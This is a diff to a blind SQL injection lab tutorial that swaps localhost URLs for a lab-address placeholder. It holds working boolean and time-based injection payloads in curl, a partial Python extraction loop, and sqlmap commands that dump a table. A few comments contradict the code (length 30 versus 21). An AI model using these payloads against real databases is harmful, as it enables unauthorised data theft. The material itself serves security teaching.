@@ -54,7 +54,10 @@ IF (condition TRUE, SLEEP(5), 0)   -- true → wait 5 seconds
 ```bash
 cd sqli-blind/lab
 docker compose up -d
-# Lab at: http://localhost:7105
+
+> 💡 **Get Lab Link:** Open this lesson on **Learning Detail** → click **"Access Lab"** to get the real link (e.g., `https://vuln.ghedahaui.online/labs-env/...`). Replace `<LAB_ADDRESS>` with that link in commands below.
+
+# Lab at: <LAB_ADDRESS>
 ```
 
 The lab is a user-ID lookup page: `id=1` shows "User exists", `id=999` shows "User not found" — **no data or error leaks**. The DB has a `secret_data` table with one `flag` column.
@@ -62,10 +65,10 @@ The lab is a user-ID lookup page: `id=1` shows "User exists", `id=999` shows "Us
 ### Step 2: Confirm blind boolean
 
 ```bash
-$ curl -s "http://localhost:7105/?id=1' AND 1=1-- -"
+$ curl -s "<LAB_ADDRESS>/?id=1' AND 1=1-- -"
 User exists
 
-$ curl -s "http://localhost:7105/?id=1' AND 1=2-- -"
+$ curl -s "<LAB_ADDRESS>/?id=1' AND 1=2-- -"
 User not found
 ```
 
@@ -79,7 +82,7 @@ Ask `LENGTH`:
 
 ```bash
 # True if flag length = 30
-$ curl -s "http://localhost:7105/?id=1' AND LENGTH((SELECT flag FROM secret_data))=21-- -"
+$ curl -s "<LAB_ADDRESS>/?id=1' AND LENGTH((SELECT flag FROM secret_data))=21-- -"
 User exists
 ```
 
@@ -89,7 +92,7 @@ User exists
 
 ```bash
 # True if first char is 'F'
-$ curl -s "http://localhost:7105/?id=1' AND ASCII(SUBSTRING((SELECT flag FROM secret_data),1,1))=70-- -"
+$ curl -s "<LAB_ADDRESS>/?id=1' AND ASCII(SUBSTRING((SELECT flag FROM secret_data),1,1))=70-- -"
 User exists
 ```
 
@@ -104,7 +107,7 @@ Instead of typing 30 chars × 30 tries manually, write a script:
 ```python
 import requests
 
-url = "http://localhost:7105/"
+url = "<LAB_ADDRESS>/"
 flag = ""
 for i in range(1, 22):           # characters 1..21
     for code in range(32, 127):  # printable ASCII 32..126
@@ -125,7 +128,7 @@ print("FLAG:", flag)
 
 ```bash
 # True → takes 5 seconds, False → instant
-$ time curl -s "http://localhost:7105/?id=1' AND IF((SELECT SUBSTRING(flag,1,1) FROM secret_data)='F',SLEEP(5),0)-- -"
+$ time curl -s "<LAB_ADDRESS>/?id=1' AND IF((SELECT SUBSTRING(flag,1,1) FROM secret_data)='F',SLEEP(5),0)-- -"
 real 5.002s   # = first char is 'F'
 ```
 
@@ -136,8 +139,8 @@ real 5.002s   # = first char is 'F'
 ### Step 7: sqlmap automation (once you understand)
 
 ```bash
-sqlmap -u "http://localhost:7105/?id=1" --batch --technique=B --dbs
-sqlmap -u "http://localhost:7105/?id=1" --batch -D lab_db -T secret_data --dump
+sqlmap -u "<LAB_ADDRESS>/?id=1" --batch --technique=B --dbs
+sqlmap -u "<LAB_ADDRESS>/?id=1" --batch -D lab_db -T secret_data --dump
 ```
 
 <!-- Output already described via CLI commands above -->
